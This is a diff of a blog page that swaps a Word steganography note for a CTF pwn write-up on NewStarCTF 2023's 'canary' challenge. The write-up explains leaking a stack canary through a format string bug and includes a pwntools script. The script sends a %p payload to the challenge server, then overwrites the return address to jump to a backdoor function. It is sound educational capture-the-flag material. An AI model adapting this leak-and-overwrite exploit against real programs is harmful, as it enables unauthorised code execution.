@@ -16,24 +16,24 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="word隐写与ppt隐写">
+    <meta name="description" content="canary格式化字符串漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="word隐写">
-<meta property="og:url" content="https://isolator-1.github.io/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/index.html">
+<meta property="og:title" content="canary">
+<meta property="og:url" content="https://isolator-1.github.io/2023/10/11/ctf-pwn/canary/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="word隐写与ppt隐写">
+<meta property="og:description" content="canary格式化字符串漏洞">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/steganography/1.jpg">
-<meta property="article:published_time" content="2023-10-10T10:04:00.000Z">
-<meta property="article:modified_time" content="2023-10-10T10:10:54.435Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/canary/1.jpg">
+<meta property="article:published_time" content="2023-10-11T03:15:00.000Z">
+<meta property="article:modified_time" content="2023-10-11T03:22:31.901Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="ctf-misc">
+<meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/steganography/1.jpg">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/canary/1.jpg">
   
   
   
-  <title>word隐写 - Isolator&#39;s Blog</title>
+  <title>canary - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="word隐写"></span>
+            <span id="subtitle" data-typed-text="canary"></span>
           
         </div>
 
@@ -209,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-10 18:04" pubdate>
-          October 10, 2023 pm
+        <time datetime="2023-10-11 11:15" pubdate>
+          October 11, 2023 am
         </time>
       </span>
     
@@ -221,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          118 words
+          861 words
         
       </span>
     
@@ -232,7 +232,7 @@
         
         
         
-          1 mins
+          8 mins
         
       </span>
     
@@ -270,17 +270,18 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">word隐写</h1>
+            <h1 style="display: none">canary</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h3><p>.docx文件改后缀为.zip</p>
-<p>里面全是xml文件，如下图</p>
-<p>用vscode打开xml时可以用<code>shift alt f</code>进行格式整理（需要装一个xml formatter）</p>
-<p><img src="/img/steganography/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>例如上图中的题目是在document.xml里放了一段密文</p>
-<p>ppt同理</p>
+                <h3 id="canary泄露"><a href="#canary泄露" class="headerlink" title="canary泄露"></a>canary泄露</h3><p>NewStarCTF 2023 canary：</p>
+<p><img src="/img/canary/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><code>__readfsqword(0x28u)</code>说明添加了canary，但是第一次输入只能输入32字节，距离把canary一块printf出来差了8字节，因此用格式化字符串漏洞把canary打印出来。</p>
+<p><code>printf</code>的参数中，rdi为第一次输入的格式化字符串，然后需要5个%p把rsi，rdx，rcx，r8，r9略过，然后再来6个%p（因为后面的参数在栈上，而canary是栈上第41-48字节，需要第六个%p才能将其打印出来）</p>
+<p>然后第二次输入就是一个最简单的rop链了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./canary&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28964</span>)<br>e = ELF(<span class="hljs-string">&quot;./canary&quot;</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>backdoor = e.sym[<span class="hljs-string">&quot;backdoor&quot;</span>]<br><br>payload = <span class="hljs-string">b&quot;%p%p%p%p%p%p%p%p%p%p%p&quot;</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Give me some gift?\n&quot;</span>, payload)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Oh thanks,There is my gift:\n&quot;</span>)<br><br>leak = p.recvline()<br><br>canary = <span class="hljs-built_in">eval</span>(leak[-<span class="hljs-number">19</span>:-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;Show me your magic\n&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -299,7 +300,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctf-misc/" class="category-chain-item">ctf-misc</a>
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
   
   
 
@@ -314,7 +315,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf-misc/">#ctf-misc</a>
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
       
     </div>
   
@@ -326,8 +327,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>word隐写</div>
-      <div>https://isolator-1.github.io/2023/10/10/ctf-misc/word隐写/</div>
+      <div>canary</div>
+      <div>https://isolator-1.github.io/2023/10/11/ctf-pwn/canary/</div>
     </div>
     <div class="license-meta">
       
@@ -339,7 +340,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>October 10, 2023</div>
+          <div>October 11, 2023</div>
         </div>
       
       
@@ -371,9 +372,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/11/ctf-pwn/canary/" title="canary">
+                      <a href="/2023/10/11/ctf-pwn/stack_migration/" title="">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">canary</span>
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -381,8 +382,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" title="计算机网络知识补习">
-                        <span class="hidden-mobile">计算机网络知识补习</span>
+                      <a href="/2023/10/10/ctf-misc/word%E9%9A%90%E5%86%99/" title="word隐写">
+                        <span class="hidden-mobile">word隐写</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
